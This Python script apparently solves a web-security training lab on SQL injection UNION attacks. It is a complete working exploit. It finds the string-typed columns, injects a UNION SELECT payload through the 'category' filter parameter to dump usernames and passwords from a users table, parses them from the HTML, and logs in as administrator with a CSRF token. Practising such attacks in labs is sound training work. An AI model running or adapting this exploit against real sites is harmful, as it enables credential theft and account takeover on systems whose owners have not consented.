#!/usr/bin/env python3
"""SQL injection UNION attack, retrieving data from other tables"""

from typing import List, NamedTuple

import bs4
import requests

import lab_04

class Lab(lab_04.Lab):
    """Wrapper"""

    User = NamedTuple("User", [("name", str), ("password", str)])

    def columns_of_string_type(self) -> List[int]:
        """Get which columns are string types"""
        string_type_indices = []
        for i in range(self.column_count()):
            if self.column_is_string_type(i):
                string_type_indices.append(i)
        return string_type_indices

    def dump_table(self, table: str,
                   fields: List[str]) -> requests.models.Response:
        """Get usernames and passwords"""
        fields_str = ",+".join(fields)
        payload = {self.key: f"'+UNION+SELECT+{fields_str}+FROM+{table}--"}
        payload_str = self._dict_to_str(payload)
        response = self.session.get(self.url + self.path, params=payload_str)
        response.raise_for_status()
        return response

    @staticmethod
    def parse_html_table(response_text: str) -> List["Lab.User"]:
        """parse usernames and passwords from HTML"""
        username_pw = []
        soup = bs4.BeautifulSoup(response_text, features="lxml")
        table = soup.find("table", attrs={"class": "is-table-longdescription"})
        rows = table.tbody.find_all("tr")
        for row in rows:
            username_pw.append(Lab.User(name=row.th.text, password=row.td.text))
        return username_pw

    def login(self, username: str, password: str,
              csrf: str = None) -> requests.models.Response:
        """Log in"""
        payload = {"username": username, "password": password}
        if csrf is not None:
            payload["csrf"] = csrf
        response = self.session.post(f"{self.url}/login", data=payload)
        response.raise_for_status()
        return response

def main() -> None:
    """Entry point"""
    site = Lab(key="category", path="/filter")
    if site.columns_of_string_type() != [0, 1]:
        raise RuntimeError(f"Expected [0, 1]; got {site.columns_of_string_type()}")
    response = site.dump_table("users", ["username", "password"])
    users = site.parse_html_table(response.text)
    admin = [user for user in users if user.name == "administrator"][0]
    csrf = site.csrf_token("/login")
    response = site.login(admin.name, admin.password, csrf=csrf)
    response.raise_for_status()
    print(response.status_code)

if __name__ == "__main__":
    main()
